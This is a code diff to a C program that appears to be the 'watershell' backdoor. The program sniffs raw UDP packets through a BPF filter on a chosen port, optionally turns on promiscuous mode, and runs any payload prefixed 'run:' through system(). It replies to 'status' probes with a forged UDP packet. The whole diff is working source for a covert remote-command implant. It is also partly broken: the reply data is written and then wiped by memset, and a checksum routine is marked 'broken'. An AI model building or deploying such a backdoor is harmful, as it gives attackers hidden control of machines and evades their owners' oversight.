@@ -15,6 +15,18 @@
  * =====================================================================================
  */
 
+/* CUSTOMIZE THESE LINES FOR HARD CODED VALUES */
+#ifndef IFACE
+#define IFACE "eth0"
+#endif
+#ifndef PORT
+#define PORT 12345
+#endif
+#ifndef PROMISC
+#define PROMISC false
+#endif
+/* COMMAND LINE ARGS WILL OVERRIDE THESE */
+
 #include <net/if.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -33,39 +45,9 @@
 #include <netinet/udp.h>
 #include <signal.h>
 #include <stdbool.h>
+#include "watershell.h"
 
-#define IFACE "eth0"
-#define PORT 12345
-#define PROMISC false
-
-struct sock_filter bpf_code[] = {
-    { 0x28, 0, 0, 0x0000000c },
-    { 0x15, 0, 6, 0x000086dd },
-    { 0x30, 0, 0, 0x00000014 },
-    { 0x15, 0, 15, 0x00000011 },
-    { 0x28, 0, 0, 0x00000036 },
-    { 0x15, 12, 0, 0x00003039 }, //5
-    { 0x28, 0, 0, 0x00000038 },
-    { 0x15, 10, 11, 0x00003039 }, //7
-    { 0x15, 0, 10, 0x00000800 },
-    { 0x30, 0, 0, 0x00000017 },
-    { 0x15, 0, 8, 0x00000011 },
-    { 0x28, 0, 0, 0x00000014 },
-    { 0x45, 6, 0, 0x00001fff },
-    { 0xb1, 0, 0, 0x0000000e },
-    { 0x48, 0, 0, 0x0000000e },
-    { 0x15, 2, 0, 0x00003039 }, //15
-    { 0x48, 0, 0, 0x00000010 },
-    { 0x15, 0, 1, 0x00003039 }, //17
-    { 0x6, 0, 0, 0x0000ffff },
-    { 0x6, 0, 0, 0x00000000 },
-};
-
-void send_status(unsigned char *buf, int code);
-void sigint(int signum);
-void ip_checksum(struct iphdr *ip);
-void udp_checksum(struct iphdr *ip, unsigned short *payload);
-
+//these need to be global so that a sigint can close everything up
 int sockfd;
 struct ifreq *sifreq;
 bool promisc;
@@ -84,6 +66,7 @@ int main(int argc, char *argv[])
 
     promisc = PROMISC;
 
+    // command line args
     while ((arg = getopt(argc, argv, "phi:l:")) != -1){
         switch (arg){
             case 'i':
@@ -112,59 +95,69 @@ int main(int argc, char *argv[])
         }
     }
 
+    // replace the port in the existing filter
     bpf_code[5].k = port;
     bpf_code[7].k = port;
     bpf_code[15].k = port;
     bpf_code[17].k = port;
 
+    /* startup a raw socket, gets raw ethernet frames containing IP packets
+     * directly from the interface, none of this AF_INET shit
+     */
     sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP));
     if (sockfd < 0){
         perror("socket");
         return 1;
     }
 
+    /* setup ifreq struct and SIGINT handler
+     * make sure we can issue an ioctl to the interface
+     */
     sifreq = malloc(sizeof(struct ifreq));
     signal(SIGINT, sigint);
     strncpy(sifreq->ifr_name, iface, IFNAMSIZ);
     if (ioctl(sockfd, SIOCGIFFLAGS, sifreq) == -1){
-        perror("ioctl GIFFLAGS");
+        perror("ioctl SIOCGIFFLAGS");
         close(sockfd);
         free(sifreq);
         return 0;
     }
 
+    //set up promisc mode if enabled
     if (promisc){
         sifreq->ifr_flags |= IFF_PROMISC;
-        if (ioctl(sockfd, SIOCSIFFLAGS, sifreq) == -1){
-            perror("ioctl SIFFLAGS");
-        }
+        if (ioctl(sockfd, SIOCSIFFLAGS, sifreq) == -1)
+            perror("ioctl SIOCSIFFLAGS");
     }
 
+    //apply the packet filter code to the socket
     filter.len = 20;
     filter.filter = bpf_code;
     if (setsockopt(sockfd, SOL_SOCKET, SO_ATTACH_FILTER,
-                   &filter, sizeof(filter)) < 0){
+                   &filter, sizeof(filter)) < 0)
         perror("setsockopt");
-    }
 
+    //sniff forever!
     for (;;){
         memset(buf, 0, 2048);
+        //get a packet, and tear it apart, look for keywords
         n = recvfrom(sockfd, buf, 2048, 0, NULL, NULL);
         ip = (struct iphdr *)(buf + sizeof(struct ethhdr));
         udp = (struct udphdr *)(buf + ip->ihl*4 + sizeof(struct ethhdr));
         udpdata = (char *)((buf + ip->ihl*4 + 8 + sizeof(struct ethhdr)));
-        if (*udpdata != 0)
-            printf("%s\n", udpdata);
+        //run a command if the data is prefixed with run:
         if (!strncmp(udpdata, "run:", 4))
-            code = system(udpdata + 4);
+            code = system(udpdata + 4); //replace with fork + exec
+        //checkup on the service, make sure it is still there
         if(!strncmp(udpdata, "status", 6))
             send_status(buf, code);
     }
-
     return 0;
 }
 
+//cleanup on SIGINT
 void sigint(int signum){
+    //if promiscuous mode was on, turn it off
     if (promisc){
         if (ioctl(sockfd, SIOCGIFFLAGS, sifreq) == -1){
             perror("ioctl GIFFLAGS");
@@ -174,18 +167,13 @@ void sigint(int signum){
             perror("ioctl SIFFLAGS");
         }
     }
+    //shut it down!
     free(sifreq);
     close(sockfd);
     exit(1);
 }
 
-struct __attribute__((__packed__)) udpframe {
-    struct ethhdr ehdr;
-    struct iphdr ip;
-    struct udphdr udp;
-    unsigned char data[ETH_DATA_LEN - sizeof(struct udphdr) - sizeof(struct iphdr)];
-};
-
+//send a reply
 void send_status(unsigned char *buf, int code){
     struct udpframe frame;
     struct sockaddr_ll saddrll;
@@ -194,15 +182,22 @@ void send_status(unsigned char *buf, int code){
     char *prefix = "LISTENING: ";
     char *ccode = (char*)calloc(1, len+1);
     char *data = calloc(1, strlen(prefix)+len+2);
+
+    //setup the data
     snprintf(ccode, len+1, "%d", code);
     strncpy(data, prefix, strlen(prefix));
     strncat(data, ccode, len+1);
     strncat(data, "\n", 1);
+    strncpy(frame.data, data, strlen(data));
+
+    //get the ifindex
     memset(&frame, 0, sizeof(frame));
     if (ioctl(sockfd, SIOCGIFINDEX, sifreq) == -1){
-        perror("GIFINDEX");
+        perror("ioctl SIOCGIFINDEX");
         return;
     }
+
+    //layer 2
     saddrll.sll_family = PF_PACKET;
     saddrll.sll_ifindex = sifreq->ifr_ifindex;
     saddrll.sll_halen = ETH_ALEN;
@@ -210,6 +205,8 @@ void send_status(unsigned char *buf, int code){
     memcpy((void*)frame.ehdr.h_source, (void*)(((struct ethhdr*)buf)->h_dest), ETH_ALEN);
     memcpy((void*)frame.ehdr.h_dest, (void*)(((struct ethhdr*)buf)->h_source), ETH_ALEN);
     frame.ehdr.h_proto = htons(ETH_P_IP);
+
+    //layer 3
     frame.ip.version = 4;
     frame.ip.ihl = sizeof(frame.ip)/4;
     frame.ip.id = htons(69);
@@ -220,19 +217,27 @@ void send_status(unsigned char *buf, int code){
     frame.ip.saddr = ((struct iphdr*)(buf+sizeof(struct ethhdr)))->daddr;
     frame.ip.daddr = ((struct iphdr*)(buf+sizeof(struct ethhdr)))->saddr;
     frame.ip.protocol = IPPROTO_UDP;
+
+    //layer 4
     frame.udp.source = ((struct udphdr*)(buf+sizeof(struct ethhdr)+sizeof(struct iphdr)))->dest;
     frame.udp.dest = ((struct udphdr*)(buf+sizeof(struct ethhdr)+sizeof(struct iphdr)))->source;
     frame.udp.len = htons(strlen(data) + sizeof(frame.udp));
-    //udp_checksum(&frame.ip, (unsigned short*)&frame.udp);
+
+    //checksums
+    udp_checksum(&frame.ip, (unsigned short*)&frame.udp);
     ip_checksum(&frame.ip);
-    strncpy(frame.data, data, strlen(data));
+
+    //calculate total length and send
     len = sizeof(struct ethhdr) + sizeof(struct udphdr) + sizeof(struct iphdr) + strlen(data);
     sendto(sockfd, (char*)&frame, len, 0, (struct sockaddr *)&saddrll, sizeof(saddrll));
+
+    //cleanup
     free(ccode);
     free(data);
 }
 
-//broken?
+/* checksum functions from http://www.roman10.net/how-to-calculate-iptcpudp-checksumpart-2-implementation/ */
+//broken.
 void udp_checksum(struct iphdr *ip, unsigned short *payload){
     register unsigned long sum = 0;
     struct udphdr *udp = (struct udphdr*)payload;
@@ -254,7 +259,6 @@ void udp_checksum(struct iphdr *ip, unsigned short *payload){
     sum = ~sum;
     udp->check = ((unsigned short)sum == 0x0000) ? 0xFFFF : (unsigned short)sum;
 }
-
 
 void ip_checksum(struct iphdr *ip){
     unsigned int count = ip->ihl<<2;
